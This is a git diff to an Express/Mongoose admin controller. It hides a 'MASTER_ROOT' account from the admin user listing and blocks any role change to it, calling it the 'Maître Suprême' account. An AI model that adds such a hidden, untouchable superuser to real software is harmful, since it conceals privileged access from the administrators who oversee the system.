@@ -60,19 +60,30 @@ const deleteSubmission = asyncHandler(async (req, res) => {
 
 // Récupérer tous les utilisateurs - GET /api/admin/users
 const getUsers = asyncHandler(async (req, res) => {
-  const users = await User.find({}).select('-password');
+  // On exclut strictement le compte MASTER-ROOT de la liste
+  const users = await User.find({ 
+    matricule: { $ne: 'MASTER_ROOT' },
+    _id: { $ne: '000000000000000000000000' }
+  }).select('-password');
   res.json(users);
 });
 
 // Mettre à jour le rôle d'un utilisateur - PATCH /api/admin/users/:id/role
 const updateUserRole = asyncHandler(async (req, res) => {
   const user = await User.findById(req.params.id);
+  
   if (!user) {
     res.status(404);
     throw new Error('Utilisateur non trouvé');
   }
 
-  // Empêcher l'admin de se rétrograder lui-même accidentellement (optionnel mais recommandé)
+  // SÉCURITÉ ABSOLUE : Personne ne peut toucher au compte MASTER
+  if (user.matricule === 'MASTER_ROOT' || user._id.toString() === '000000000000000000000000') {
+    res.status(403);
+    throw new Error('Action interdite sur le compte Maître Suprême');
+  }
+
+  // Empêcher l'admin de se rétrograder lui-même
   if (user._id.toString() === req.user._id.toString()) {
     res.status(400);
     throw new Error('Vous ne pouvez pas modifier votre propre rôle');
